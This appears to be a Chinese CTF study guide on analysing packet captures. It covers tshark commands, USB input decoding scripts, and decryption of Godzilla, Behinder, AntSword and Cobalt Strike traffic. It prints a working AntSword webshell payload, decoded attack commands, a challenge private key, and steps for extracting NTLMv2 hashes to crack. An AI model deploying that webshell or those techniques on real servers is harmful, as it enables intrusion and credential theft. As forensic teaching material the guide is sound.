# Misc-Network Traffic Analysis


**This is a Simple Guide for Network Traffic Analysis.** 

&lt;!--more--&gt;

拿到流量包后，第一件事就是可以先 strings | grep flag{ 一下，说不定 flag 就直接出了

当然也可以使用凤二西师傅的 破空_flag查找工具3.5.exe 来搜索 flag

## WireShark基础

刚刚接触流量分析的同学可能会不太清楚 wireshark 的过滤器如何使用

但是用熟悉了其实很简单

常见的协议比如 http ，常用的有下面这些参数，其实只要在过滤器中输入 http. 它就会自动提示你了

```
http.request.method == &#34;POST&#34;
http.request.full_uri == “XXX”
......
```

还有一些比较常用的

```bash
# 包含什么内容的帧
frame contains &#34;XXX&#34;
```

其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）

有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了

![](imgs/N1.png)



## tshark使用教程

导出流量包中所有POST数据包的data数据

```bash
tshark -r 1.pcapng -Y &#34;http.request.method == POST&#34; -T fields -e data.data &gt; data.txt
# -r [输入的pcap文件路径]: 指定要分析的pcap文件。
# -Y &#34;http.request.method == POST&#34;: 使用一个显示过滤器只显示POST请求。
# -T fields: 输出指定的字段数据。
# -e http.file_data: 输出HTTP负载的数据。
```

导出HTTP数据包中所有的数据

```bash
tshark -r 1.pcapng -Y &#34;http&#34; -T fields -e http.file_data &gt; data.txt
```

可以使用 uniq 参数去除重复行

```bash
tshark -r 1.pcapng -Y &#34;dns&#34; -T fields -e dns.qry.name | uniq  &gt; data.txt
```

## 流量分析基础考点

### 1、wireshark提取数据流:

可以用tcpxtract工具：tcpxtract -f 1.pcap

strings webshell.pcapng | grep {

//打印出文件中所有可打印字符

### 2、协议分级&#43;导出HTTP对象

### 2、流量包端口隐写（可能会有01互换）

### 3、TCP/FTP协议传输文件(binwalk和foremost都没用)：

1、直接用wireshark导出为pcap文件然后用networkminer分析

2、拉入kali用tcpxtract提取文件：tcpxtract -f &#43;文件名.pcap

3、直接追踪流提取16进制，根据文件头尾提取出文件

### 4、有时候可能需要分版本分别导出

### 5、可能可以直接搜索flag明文或者编码加密过的flag

搜索flag脚本，待改进。。。

```python
#Python2 的脚本
# encoding:utf-8
import os
import os.path
import sys
import subprocess

#打印可打印字符串
def str_re(str1):
    str2=&#34;&#34;
    for i in str1.decode(&#39;utf8&#39;,&#39;ignore&#39;):
        try:
            #print(ord(i))
            if ord(i) &lt;= 126 and ord(i) &gt;= 33:
                str2 &#43;= i
        except:
                str2 &#43;= &#34;&#34;
    #print(str2)
    return str2


#写入文本函数
def txt_wt(name,txt1):
    with open(&#34;output.txt&#34;,&#34;a&#34;) as f:
        f.write(&#39;filename:&#39;&#43;name)
        f.write(&#34;\n&#34;)
        f.write(&#39;flag:&#39;&#43;txt1)
        f.write(&#34;\n&#34;)

#第一次运行，清空output文件
def clear_txt():
    with open(&#34;output.txt&#34;,&#34;w&#34;) as f:
        print &#34;clear output.txt！！！&#34;

# 递归遍历的所有文件
def file_bianli():
    # 路径设置为当前目录
    path = os.getcwd()
    # 返回文件下的所有文件列表
    file_list = []
    for i, j, k in os.walk(path):
        for dd in k:
            if &#34;.py&#34; not in dd  and &#34;output.txt&#34; not in dd:
                file_list.append(os.path.join(i, dd))
    return file_list

#查找文件中可能为flag的字符串

def flag(file_list,flag):
    for i in file_list:
        try:
            with open(i,&#34;rb&#34;) as f:
                for j in f.readlines():
                    j1=str_re(j)#可打印字符串
                    #print j1
                    for k in flag:
                        if k in j1:
                            txt_wt(i, j1)
                            print &#39;filename:&#39;,i
                            print &#39;flag:&#39;,j1
        except:
            print &#39;err&#39;

flag_txt = [&#39;flag{&#39;, &#39;666c6167&#39;,&#39;flag&#39;,&#39;Zmxh&#39;,&#39;&amp;#102&#39;, &#39;666C6167&#39;]

#清空输出的文本文件
clear_txt()
#遍历文件名
file_lt=file_bianli()
#查找flag关键字
flag(file_lt,flag_txt)
```

## USB流量分析

4字节为鼠标流量，8字节为键盘流量。

数据部分在Leftover Capture Data域中

### 键盘流量分析

例题5：键盘流量分析

先在wsl或者别的虚拟机中用tshark提取数据

```bash
#提取数据的命令，这里用正则表达式剔除了空行
tshark -r usb.pcapng -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt
# -r 指定了需要读取的文件
# -T 表示仅仅输出所选字段
# -e 指定提取的字段
# 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）
```

Tips：老版本的tshark提取数据是有冒号的，新版本就没有冒号了，所以需要我们自己添加冒号

```python
#给键盘流量数据添加冒号.py
f = open(&#39;usbdata.txt&#39;, &#39;r&#39;)
fi = open(&#39;out.txt&#39;, &#39;w&#39;)
while 1:
    a = f.readline().strip()
    if a:
        if len(a) == 16:  # 鼠标流量的话len改为8
            out = &#39;&#39;
            for i in range(0, len(a), 2):
                if i &#43; 2 != len(a):
                    out &#43;= a[i] &#43; a[i &#43; 1] &#43; &#34;:&#34;
                else:
                    out &#43;= a[i] &#43; a[i &#43; 1]
            fi.write(out)
            fi.write(&#39;\n&#39;)
    else:
        break

fi.close()
```

加完冒号以后我们就可以直接用脚本翻译数据了

```python
#翻译键盘数据1.py
normalKeys={&#34;04&#34;:&#34;a&#34;,&#34;05&#34;:&#34;b&#34;,&#34;06&#34;:&#34;c&#34;,&#34;07&#34;:&#34;d&#34;,&#34;08&#34;:&#34;e&#34;,&#34;09&#34;:&#34;f&#34;,&#34;0a&#34;:&#34;g&#34;,&#34;0b&#34;:&#34;h&#34;,&#34;0c&#34;:&#34;i&#34;,&#34;0d&#34;:&#34;j&#34;,&#34;0e&#34;:&#34;k&#34;,&#34;0f&#34;:&#34;l&#34;,&#34;10&#34;:&#34;m&#34;,&#34;11&#34;:&#34;n&#34;,&#34;12&#34;:&#34;o&#34;,&#34;13&#34;:&#34;p&#34;,&#34;14&#34;:&#34;q&#34;,&#34;15&#34;:&#34;r&#34;,&#34;16&#34;:&#34;s&#34;,&#34;17&#34;:&#34;t&#34;,&#34;18&#34;:&#34;u&#34;,&#34;19&#34;:&#34;v&#34;,&#34;1a&#34;:&#34;w&#34;,&#34;1b&#34;:&#34;x&#34;,&#34;1c&#34;:&#34;y&#34;,&#34;1d&#34;:&#34;z&#34;,&#34;1e&#34;:&#34;1&#34;,&#34;1f&#34;:&#34;2&#34;,&#34;20&#34;:&#34;3&#34;,&#34;21&#34;:&#34;4&#34;,&#34;22&#34;:&#34;5&#34;,&#34;23&#34;:&#34;6&#34;,&#34;24&#34;:&#34;7&#34;,&#34;25&#34;:&#34;8&#34;,&#34;26&#34;:&#34;9&#34;,&#34;27&#34;:&#34;0&#34;,&#34;28&#34;:&#34;&lt;RET&gt;&#34;,&#34;29&#34;:&#34;&lt;ESC&gt;&#34;,&#34;2a&#34;:&#34;&lt;DEL&gt;&#34;,&#34;2b&#34;:&#34;\t&#34;,&#34;2c&#34;:&#34;&lt;SPACE&gt;&#34;,&#34;2d&#34;:&#34;-&#34;,&#34;2e&#34;:&#34;=&#34;,&#34;2f&#34;:&#34;[&#34;,&#34;30&#34;:&#34;]&#34;,&#34;31&#34;:&#34;\\&#34;,&#34;32&#34;:&#34;&lt;NON&gt;&#34;,&#34;33&#34;:&#34;;&#34;,&#34;34&#34;:&#34;&#39;&#34;,&#34;35&#34;:&#34;&lt;GA&gt;&#34;,&#34;36&#34;:&#34;,&#34;,&#34;37&#34;:&#34;.&#34;,&#34;38&#34;:&#34;/&#34;,&#34;39&#34;:&#34;&lt;CAP&gt;&#34;,&#34;3a&#34;:&#34;&lt;F1&gt;&#34;,&#34;3b&#34;:&#34;&lt;F2&gt;&#34;,&#34;3c&#34;:&#34;&lt;F3&gt;&#34;,&#34;3d&#34;:&#34;&lt;F4&gt;&#34;,&#34;3e&#34;:&#34;&lt;F5&gt;&#34;,&#34;3f&#34;:&#34;&lt;F6&gt;&#34;,&#34;40&#34;:&#34;&lt;F7&gt;&#34;,&#34;41&#34;:&#34;&lt;F8&gt;&#34;,&#34;42&#34;:&#34;&lt;F9&gt;&#34;,&#34;43&#34;:&#34;&lt;F10&gt;&#34;,&#34;44&#34;:&#34;&lt;F11&gt;&#34;,&#34;45&#34;:&#34;&lt;F12&gt;&#34;}
shiftKeys={&#34;04&#34;:&#34;A&#34;,&#34;05&#34;:&#34;B&#34;,&#34;06&#34;:&#34;C&#34;,&#34;07&#34;:&#34;D&#34;,&#34;08&#34;:&#34;E&#34;,&#34;09&#34;:&#34;F&#34;,&#34;0a&#34;:&#34;G&#34;,&#34;0b&#34;:&#34;H&#34;,&#34;0c&#34;:&#34;I&#34;,&#34;0d&#34;:&#34;J&#34;,&#34;0e&#34;:&#34;K&#34;,&#34;0f&#34;:&#34;L&#34;,&#34;10&#34;:&#34;M&#34;,&#34;11&#34;:&#34;N&#34;,&#34;12&#34;:&#34;O&#34;,&#34;13&#34;:&#34;P&#34;,&#34;14&#34;:&#34;Q&#34;,&#34;15&#34;:&#34;R&#34;,&#34;16&#34;:&#34;S&#34;,&#34;17&#34;:&#34;T&#34;,&#34;18&#34;:&#34;U&#34;,&#34;19&#34;:&#34;V&#34;,&#34;1a&#34;:&#34;W&#34;,&#34;1b&#34;:&#34;X&#34;,&#34;1c&#34;:&#34;Y&#34;,&#34;1d&#34;:&#34;Z&#34;,&#34;1e&#34;:&#34;!&#34;,&#34;1f&#34;:&#34;@&#34;,&#34;20&#34;:&#34;#&#34;,&#34;21&#34;:&#34;$&#34;,&#34;22&#34;:&#34;%&#34;,&#34;23&#34;:&#34;^&#34;,&#34;24&#34;:&#34;&amp;&#34;,&#34;25&#34;:&#34;*&#34;,&#34;26&#34;:&#34;(&#34;,&#34;27&#34;:&#34;)&#34;,&#34;28&#34;:&#34;&lt;RET&gt;&#34;,&#34;29&#34;:&#34;&lt;ESC&gt;&#34;,&#34;2a&#34;:&#34;&lt;DEL&gt;&#34;,&#34;2b&#34;:&#34;\t&#34;,&#34;2c&#34;:&#34;&lt;SPACE&gt;&#34;,&#34;2d&#34;:&#34;_&#34;,&#34;2e&#34;:&#34;&#43;&#34;,&#34;2f&#34;:&#34;{&#34;,&#34;30&#34;:&#34;}&#34;,&#34;31&#34;:&#34;|&#34;,&#34;32&#34;:&#34;&lt;NON&gt;&#34;,&#34;33&#34;:&#34;\&#34;&#34;,&#34;34&#34;:&#34;:&#34;,&#34;35&#34;:&#34;&lt;GA&gt;&#34;,&#34;36&#34;:&#34;&lt;&#34;,&#34;37&#34;:&#34;&gt;&#34;,&#34;38&#34;:&#34;?&#34;,&#34;39&#34;:&#34;&lt;CAP&gt;&#34;,&#34;3a&#34;:&#34;&lt;F1&gt;&#34;,&#34;3b&#34;:&#34;&lt;F2&gt;&#34;,&#34;3c&#34;:&#34;&lt;F3&gt;&#34;,&#34;3d&#34;:&#34;&lt;F4&gt;&#34;,&#34;3e&#34;:&#34;&lt;F5&gt;&#34;,&#34;3f&#34;:&#34;&lt;F6&gt;&#34;,&#34;40&#34;:&#34;&lt;F7&gt;&#34;,&#34;41&#34;:&#34;&lt;F8&gt;&#34;,&#34;42&#34;:&#34;&lt;F9&gt;&#34;,&#34;43&#34;:&#34;&lt;F10&gt;&#34;,&#34;44&#34;:&#34;&lt;F11&gt;&#34;,&#34;45&#34;:&#34;&lt;F12&gt;&#34;}
output = []
keys = open(&#39;out.txt&#39;)
for line in keys:
    try:
        if line[0] != &#39;0&#39; or (
                line[1] != &#39;0&#39; and line[1] != &#39;2&#39;
        ) or line[3] != &#39;0&#39; or line[4] != &#39;0&#39; or line[9] != &#39;0&#39; or line[
                10] != &#39;0&#39; or line[12] != &#39;0&#39; or line[13] != &#39;0&#39; or line[
                    15] != &#39;0&#39; or line[16] != &#39;0&#39; or line[18] != &#39;0&#39; or line[
                        19] != &#39;0&#39; or line[21] != &#39;0&#39; or line[
                            22] != &#39;0&#39; or line[6:8] == &#34;00&#34;:
            continue
        if line[6:8] in normalKeys.keys():
            output &#43;= [[normalKeys[line[6:8]]],
                       [shiftKeys[line[6:8]]]][line[1] == &#39;2&#39;]
        else:
            output &#43;= [&#39;[unknown]&#39;]
    except:
        pass

keys.close()

flag = 0
print(&#34;&#34;.join(output))
for i in range(len(output)):
    try:
        a = output.index(&#39;&lt;DEL&gt;&#39;)
        del output[a]
        del output[a - 1]
    except:
        pass

for i in range(len(output)):
    try:
        if output[i] == &#34;&lt;CAP&gt;&#34;:
            flag &#43;= 1
            output.pop(i)
            if flag == 2:
                flag = 0
        if flag != 0:
            output[i] = output[i].upper()
    except:
        pass

print(&#39;output :&#39; &#43; &#34;&#34;.join(output))
```

```python
#翻译键盘数据2.py
mappings={0x04:&#34;A&#34;,0x05:&#34;B&#34;,0x06:&#34;C&#34;,0x07:&#34;D&#34;,0x08:&#34;E&#34;,0x09:&#34;F&#34;,0x0A:&#34;G&#34;,0x0B:&#34;H&#34;,0x0C:&#34;I&#34;,0x0D:&#34;J&#34;,0x0E:&#34;K&#34;,0x0F:&#34;L&#34;,0x10:&#34;M&#34;,0x11:&#34;N&#34;,0x12:&#34;O&#34;,0x13:&#34;P&#34;,0x14:&#34;Q&#34;,0x15:&#34;R&#34;,0x16:&#34;S&#34;,0x17:&#34;T&#34;,0x18:&#34;U&#34;,0x19:&#34;V&#34;,0x1A:&#34;W&#34;,0x1B:&#34;X&#34;,0x1C:&#34;Y&#34;,0x1D:&#34;Z&#34;,0x1E:&#34;1&#34;,0x1F:&#34;2&#34;,0x20:&#34;3&#34;,0x21:&#34;4&#34;,0x22:&#34;5&#34;,0x23:&#34;6&#34;,0x24:&#34;7&#34;,0x25:&#34;8&#34;,0x26:&#34;9&#34;,0x27:&#34;0&#34;,0x28:&#34;\n&#34;,0x2a:&#34;[DEL]&#34;,0X2B:&#34;&#34;,0x2C:&#34;&#34;,0x2D:&#34;-&#34;,0x2E:&#34;=&#34;,0x2F:&#34;[&#34;,0x30:&#34;]&#34;,0x31:&#34;\\&#34;,0x32:&#34;~&#34;,0x33:&#34;;&#34;,0x34:&#34;&#39;&#34;,0x36:&#34;,&#34;,0x37:&#34;.&#34;}
nums = []
keys = open(&#39;out.txt&#39;)
for line in keys:
    if line[0] != &#39;0&#39; or line[1] != &#39;0&#39; or line[3] != &#39;0&#39; or line[
            4] != &#39;0&#39; or line[9] != &#39;0&#39; or line[10] != &#39;0&#39; or line[
                12] != &#39;0&#39; or line[13] != &#39;0&#39; or line[15] != &#39;0&#39; or line[
                    16] != &#39;0&#39; or line[18] != &#39;0&#39; or line[19] != &#39;0&#39; or line[
                        21] != &#39;0&#39; or line[22] != &#39;0&#39;:
        continue
    nums.append(int(line[6:8], 16))

keys.close()

output = &#34;&#34;
for n in nums:
    if n == 0:
        continue
    if n in mappings:
        output &#43;= mappings[n]
    else:
        output &#43;= &#39;[unknown]&#39;

print(&#39;output :\n&#39; &#43; output)
```

提取出来的数据如果有\&lt;SPACE\&gt;\&lt;DEL\&gt;\&lt;RET\&gt;,我们可以用vscode中的正则匹配来替换他们

### 鼠标流量

例题6：键盘流量分析

前两步和键盘流量一样，提取数据并加冒号，但是这里要注意判断数据的长度

```python
#给数据添加冒号.py
f = open(&#39;usbdata.txt&#39;, &#39;r&#39;)
fi = open(&#39;out.txt&#39;, &#39;w&#39;)
while 1:
    a = f.readline().strip()
    if a:
        if len(a) == 8:  # 键盘流量的话len改为16
            out = &#39;&#39;
            for i in range(0, len(a), 2):
                if i &#43; 2 != len(a):
                    out &#43;= a[i] &#43; a[i &#43; 1] &#43; &#34;:&#34;
                else:
                    out &#43;= a[i] &#43; a[i &#43; 1]
            fi.write(out)
            fi.write(&#39;\n&#39;)
    else:
        break

fi.close()
```

根据加完冒号的数据获取坐标

```python
#获取鼠标坐标.py
nums = []
keys = open(&#39;out.txt&#39;,&#39;r&#39;)
f = open(&#39;xy.txt&#39;,&#39;w&#39;)
posx = 0
posy = 0
for line in keys:
    if len(line) != 12 :
        continue
    x = int(line[3:5],16)
    y = int(line[6:8],16)
    if x &gt; 127 :
        x -= 256
    if y &gt; 127 :
        y -= 256
    posx &#43;= x
    posy &#43;= y
    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing
    if btn_flag == 1 : # 1 代表左键
        f.write(str(posx))
        f.write(&#39; &#39;)
        f.write(str(posy))
        f.write(&#39;\n&#39;)

f.close()
```

之后可以用gnuplot或者用python脚本画图

```bash
#gnuplot画图命令
gnuplot&gt; plot &#34;xy.txt&#34;
```

```python
#根据坐标画图.py
import matplotlib.pyplot as plt
import numpy as np

x, y = np.loadtxt(&#39;xy.txt&#39;, delimiter=&#39; &#39;, unpack=True)
plt.plot(x, y, &#39;.&#39;)
plt.show()
```

如果图片是反的或者是镜像的，可以用美图秀秀或者PS处理一下

### 总结一下我的做题步骤（WSL）：

**一、先用wireshark查看流量包，看看是键盘流量还是鼠标流量（有可能二者都有哦）**

**二、用tshark提取数据**

**三、用脚本添加冒号**

**四、翻译文字并处理或者提取坐标画图**

## 数位板流量分析：

[例题1-2022浙江省赛决赛-hard_Digital_plate](https://goodlunatic.github.io/posts/3f7db4e/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-hard_digital_plate)

例题2-RoarCTF MISC Davinci_Cipher

```bash
# 先导出数据并去除空行
tshark -r hard_Digital_plate.pcapng -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; out.txt
# -r 指定了需要读取的文件
# -T 表示仅仅输出所选字段
# -e 指定提取的字段
# 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）
```

类似于：

```
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08803708951e000000000000
08813708951e650000000000
08813808951ec10000000000
08813908951e2e0100000000
08813a08951e940100000000
08813b08951ee20100000000
08813c08951e1c0200000000
08813c08951e440200000000
08813c08951e610200000000
```

需要我们根据设备的传输协议来分析出对应的xy坐标以及压感数据

```python
#数位板低压感数据分析.py
nums = []
keys = open(&#39;out.txt&#39;, &#39;r&#39;)
result = open(&#39;xy.txt&#39;, &#39;w&#39;)
for line in keys:
    if int(line[12:16], 16) == 0:
        continue
    x = int(line[4:6], 16) &#43; int(line[6:8], 16) * 0xff
    y = int(line[8:10], 16) &#43; int(line[10:12], 16) * 0xff
    if int(line[12:16], 16) &lt; 0xf000:
        result.write(str(x)&#43;&#39; &#39;&#43;str(-y)&#43;&#39;\n&#39;)
keys.close()
result.close()
```

```python
import matplotlib.pyplot as plt


press_lst = []

with open(&#34;out.txt&#34;,&#34;r&#34;) as f:
    lines = f.readlines()

def draw_pic1():
    x = []
    y = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            press_data = int(line[12:16],16)
            x.append(int(line[6:8],16)*0xff&#43;int(line[4:6],16))
            y.append(int(line[10:12],16)*0xff&#43;int(line[8:10],16))
            
    plt.scatter(x,y)
    plt.grid() # 显示网格
    plt.show()

def draw_pic2():
    x = []
    y = []
    for line in lines:
        if(int(line[12:16],16) != 0):
            press_data = int(line[12:16],16)
            press_lst.append(press_data)
            if(press_data &lt; 65000):
                x.append(int(line[6:8],16)*0xff&#43;int(line[4:6],16))
                y.append(-1 * (int(line[10:12],16)*0xff&#43;int(line[8:10],16)))
            
    plt.scatter(x,y)
    plt.grid() # 显示网格
    plt.show()
    
if __name__ == &#34;__main__&#34;:
    draw_pic1()
    draw_pic2()
    print(press_lst)
```

## SQL注入流量分析

可以使用 wireshark 的过滤器过滤出注入的流量，然后导出特定分组

然后使用 tshark 根据字段名提取出所有的注入语句

如果是盲注的话，直接写个正则匹配脚本提取数据即可

例题1-2023 铁三 traffic

## Webshell流量分析

Tips：如果返回的响应数据是gzip格式，要注意提取的位置，gzip数据一般是以 1F 8B 08 00 开头的

### 菜刀流量分析

在TCP和HTTP协议中寻找线索，找返回包中一大串的数据，并根据标志位判断文件类型
如果是加密了的压缩包，看看是不是伪加密

### 哥斯拉流量分析

#### 3.03版本

哥斯拉的连接需要填写密码和密钥，加密过程中使用的是密钥MD5的前16位

**Request解密脚本**

```php
&lt;?php

function encode($D,$K){
    for($i=0;$i&lt;strlen($D);$i&#43;&#43;){
        $c = $K[$i&#43;1&amp;15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass=&#39;pass&#39;;
$payloadName=&#39;payload&#39;;
$key=&#39;3c6e0b8a9c15224a&#39;;

echo encode(base64_decode(urldecode(&#39;&#39;)),$key);
//有时候Request解密也需要gzdecode
echo gzdecode(encode(base64_decode(urldecode(&#39;&#39;)), $key));
```

**Response解密脚本**

```
&lt;?php
function encode($D,$K){
    for($i=0;$i&lt;strlen($D);$i&#43;&#43;){
        $c = $K[$i&#43;1&amp;15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}

$pass=&#39;pass&#39;;
$payloadName=&#39;payload&#39;;
$key=&#39;3c6e0b8a9c15224a&#39;;
// 原来的数据去掉前十六位和后十六位然后解密
echo gzdecode(encode(base64_decode(&#39;DlMRWA1cL1gOVDc2MjRhRwZFEQ==&#39;),$key));
```

**解密的例子**

request解密

```php
echo encode(base64_decode(urldecode(&#39;DlMRWA1cL1gOVDc%2FMjRhVAZCJ1ERUQJKKl9TXQ%3D%3D&#39;)), $key);
//getBasicsInfo

echo gzdecode(encode(base64_decode(urldecode(&#39;fL1tMGI4YTljMSj8jz6jA3d2hOK3r9ldE1qWHCQw5iUyciHYwoApdQ2q4%2B6UwuZnokGyih%2BkiHExtpdwzdcYbcgX9fDGOqekEG0dGJhlwPAYnbSoMmLbfNCAAOREiM6%2BdrzW5dmQQHmrvf3x40sVcGT3bOqpDSpn2IV5%2FP0YvGN9oTSJH9QUJk5U6Ro0v5RHLe4Mm%2By6saafb0Vyq2xDYsoZK0TfoMI5YzE%3D&#39;)), $key));
/**cmdLine}sh -c &#34;cd &#34;/www/admin/www.webshell.com_80/wwwroot/upload/&#34;;zip -e flag.zip flag.txt -P sXZfCyHSjCWqfSSEmgBj8jGkJhu87cBrd&#34; 2&gt;&amp;1methodName
execCommand**/
```

Response解密

```php
echo gzdecode(encode(base64_decode(urldecode(&#39;fL1tMGI4YTljMn75e3i2GMoehBqscKzwshr9GtI2YQRVyPwjYjhh&#39;)), $key));
//flag.txt shell.php
```



### 冰蝎流量分析

简要加密过程（请求）

base64 -&gt; AES(key = ？？？ IV = 0123456789abcdef) -&gt; base64
有时候 IV = \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
简要解密过程（响应）

解密过程反过来即可

从流量包中的HTTP数据包中获取key和data，然后用CyberChef解密即可

![](imgs/N2.png)



![](imgs/N3.png)



![](imgs/N4.png)

这里如果想要偷懒，对于冰蝎和哥斯拉流量可以直接用 风二西 师傅的 承影_哥斯拉冰蝎解码工具 一把梭了

直接将木马中的密钥复制到工具中，然后 Ctrl&#43;A 全选加密的数据，再右键选择对应的解密方式即可

![](imgs/N5.png)


### 蚁剑流量分析

蚁剑流量分析需要注意的地方：

1、路径base64字符串需要去除前两个字符后再解码

2、响应数据的头尾有额外的字符，需要先去除然后再base64解码

蚁剑webshell样本

```php
&lt;?php
// 设置一些PHP配置
@ini_set(&#34;display_errors&#34;, &#34;0&#34;); // 关闭显示错误信息
@set_time_limit(0); // 设置脚本执行时间为无限制
// 获取open_basedir配置
$opdir = @ini_get(&#34;open_basedir&#34;);
// 如果open_basedir配置存在
if ($opdir) {
    // 获取当前脚本所在目录
    $ocwd = dirname($_SERVER[&#34;SCRIPT_FILENAME&#34;]);
    // 将open_basedir路径分割成数组
    // /;|:/
    $oparr = preg_split(base64_decode(&#34;Lzt8Oi8=&#34;), $opdir);
    // 将当前目录和系统临时目录添加到数组中
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    // 遍历open_basedir数组
    foreach ($oparr as $item) {
        // 如果目录不可写，继续下一个目录
        if (!@is_writable($item)) {
            continue;
        }
        // 创建一个临时目录
        $tmdir = $item . &#34;/.573ef8c9dd12&#34;;
        @mkdir($tmdir);
        // 如果目录创建失败，继续下一个目录
        if (!@file_exists($tmdir)) {
            continue;
        }
        // 获取临时目录的真实路径
        $tmdir = realpath($tmdir);
        // 切换到临时目录
        @chdir($tmdir);
        // 修改open_basedir配置，使其可以访问上层目录
        @ini_set(&#34;open_basedir&#34;, &#34;..&#34;);
        // 获取目录路径的数组
        $cntarr = @preg_split(&#34;/\\\\|\//&#34;, $tmdir);
        // 逐级返回上层目录，以还原open_basedir配置
        for ($i = 0; $i &lt; sizeof($cntarr); $i&#43;&#43;) {
            @chdir(&#34;..&#34;);
        }
        // 恢复open_basedir配置为根目录
        @ini_set(&#34;open_basedir&#34;, &#34;/&#34;);
        // 删除临时目录
        @rmdir($tmdir);
        // 跳出循环，只操作第一个可写目录
        break;
    }
}
// 自定义函数，对输出进行base64编码
function asenc($out)
{
    return @base64_encode($out);
}
// 自定义函数，获取输出缓冲区内容并进行处理
function asoutput()
{
    $output = ob_get_contents(); // 获取输出缓冲区内容
    ob_end_clean(); // 清空输出缓冲区
    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
    echo &#34;fb708664&#34;;
    echo @asenc($output);
    echo &#34;870b983ed5&#34;;
}
// 开始输出缓冲区
ob_start();
try {
    // 解码POST请求中的文件路径和内容
    // 从这个变量的值中取出从第二个字符开始到最后的子字符串，蚁剑需要去除前两个字母的原因所在
    $f = base64_decode(substr($_POST[&#34;idb82191cedb24&#34;], 2));
    $c = $_POST[&#34;e748c4dcd196bb&#34;];
    $c = str_replace(&#34;\r&#34;, &#34;&#34;, $c);
    $c = str_replace(&#34;\n&#34;, &#34;&#34;, $c);
    $buf = &#34;&#34;;
    // 将内容进行URL解码
    for ($i = 0; $i &lt; strlen($c); $i &#43;= 2) {
        $buf .= urldecode(&#34;%&#34; . substr($c, $i, 2));
    }
    // 将解码后的内容写入文件，并返回结果
    echo (@fwrite(fopen($f, &#34;a&#34;), $buf) ? &#34;1&#34; : &#34;0&#34;);
} catch (Exception $e) {
    // 如果发生异常，输出错误信息
    echo &#34;ERROR://&#34; . $e-&gt;getMessage();
}
// 调用自定义函数处理输出
asoutput();
// 终止脚本执行
die();
?&gt;
```

这里总结一下我手动分析蚁剑流量的步骤：

1、首先url解码请求包，然后base64解码其中的php文件和该文件执行的命令

2、找到php文件中asoutput函数的标识字符串

```php
function asoutput()
{
    $output = ob_get_contents(); // 获取输出缓冲区内容
    ob_end_clean(); // 清空输出缓冲区
    // 输出一些标识字符串以及经过base64编码的缓冲区内容，响应内容前后有额外字符的原因所在
    echo &#34;fb708664&#34;;
    echo @asenc($output);
    echo &#34;870b983ed5&#34;;
}
```

3、根据gzip的文件头提取响应包，去除标识字符串后base64解码得到响应数据

4、按照上面的步骤逐个分析流量包



### CobalStrike流量分析

先从流量包中导出key文件

然后在 cs-scripts中运行 python3 parse_beacon_keys.py 得到私钥

```
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT&#43;pVELCnX1r
To4LhSzcP7sPOrIOQg0onSpKO1tzOVX&#43;2DqtZsSFoFrAmrEV&#43;gZCbFfhYR9vs5DGLUg9aa0i5Gqh
Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN&#43;wOYZEorInV9gPkCJdAgMBAAEC
gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V
r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ&#43;rYnCezQcrt4V3c7BZtW9RjFW
vHh09PF808Yl4/&#43;&#43;&#43;vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL
3MK&#43;EtafnYIDD1IS&#43;97K0cbg922RKXNdv&#43;kCQQDWJk0kNe8ePBpwJU4slig1Y&#43;4VWuwTRz6r&#43;MNp
v&#43;WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG
9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB&#43;aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C
dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB
AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2
ddsyNI6XbCU=
-----END PRIVATE KEY-----
```

在数据包的HTTP请求中获得Cookie，然后修改CS_Decrypt中的 Beacon_metadata_RSA_Decrypt.py 的私钥和Cookie

运行即可得到 AES和HMAC key

```
AES key:ef08974c0b06bd5127e04ceffe12597b
HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9
```

然后把这两个key填入 Beacon_Task_return_AES_Decrypt.py 中

把流量包中的POST数据包中的data的值用CyberChef (from hex&#43;to base64) 处理后得到的数据填入上面那个脚本中

一个个解密每个POST数据包中的data即可得到flag

## NTLM流量分析

NTLM流量分析需要的信息，在追踪流中是找不到的，需要我们深入分析具体的每个流量包

可以用关键字 ntlmssp 过滤流量包，然后看每个流量包右侧的 info 栏快速定位NTLM信息的位置

### 提取 NTLMv2 哈希值并破解（SMB协议）

首先，使用关键字 ntlmssp 对流量包进行筛选并定位到认证成功的 NTLMSSP_AUTH 包
打开流量包中的 Security Blob 层
复制用户名、域名

然后，分析NTLM响应部分，找到NTProofStr字段和NTLMv2的响应，将它们作为十六进制字符串复制到文本文档中
